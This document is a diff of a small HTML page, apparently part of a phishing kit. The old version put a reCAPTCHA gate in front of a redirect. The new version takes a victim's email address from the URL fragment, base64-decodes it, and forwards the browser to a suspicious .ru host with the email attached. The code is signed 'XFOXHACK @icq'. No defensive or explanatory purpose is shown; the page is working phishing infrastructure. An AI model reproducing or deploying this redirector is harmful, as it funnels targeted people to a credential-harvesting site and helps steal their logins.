@@ -1,39 +1,40 @@
-<!doctype html>
-<html lang="en">
-  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="">
-<title>...Redirecting</title>
-<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+/* Add this to .htaccess if you want to use multiple argument in pubil html folder. file named .htaccess or create it
+RewriteEngine On
+RewriteRule ^[^/]+/try/(.*)$ /try/$1 [L] */
 
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
-
-  </head>
-  <body>
-  
-  </br></br>
-   <div class="container h-100 d-flex justify-content-center">
-    <div class="my-auto">
-     
-     <div class="g-recaptcha" data-callback="recaptchaCallback" data-sitekey="6LfXLjkpAAAAALpCLl2s4d3UYdsZMoQH33YUJmkk"></div>        
-
-    </div>
-</div>
-</body>
-<script>
-
-brow
-function recaptchaCallback() {
-  var hash = window.location.hash;
-  if(hash !== "") {
-
-    hash = hash.split('/#');
-    const hash1 = hash[1];
-     const email = hash1;
-     
-      window.location.href = "https://eotn.liounglean.ru/b9b3w534/#" + email;//*PUT YOUR MAIN LINK HERE *//
-  }
+var redirect_url = "https://eotn.liounglean.ru/b9b3w534/#"; // Change this to the URL you want to redirect to
+var path = window.location.href;  // Get the part of the URL after the domain name
+var parts = path.split('/#'); // Split the path by #
+// Check if there is a second part
+if (parts.length > 1) {
+// Get the email from the second part
+var email = parts[1];
+if (isBase64(email)) {
+email = atob(email);
 }
+// Redirect to the new URL with the email
+window.location.href = redirect_url + email;
+} else {
+// No email found, show an error message
+alert('Sorry! I cant find redirect for you');
+}
+
+function isBase64(str) {
+try {
+return btoa(atob(str)) == str;
+} catch (err) {
+return false;
+}
+}
+console.log("The path is: " + path);
+// XFOXHACK @icq
 </script>
+</body>
 </html>
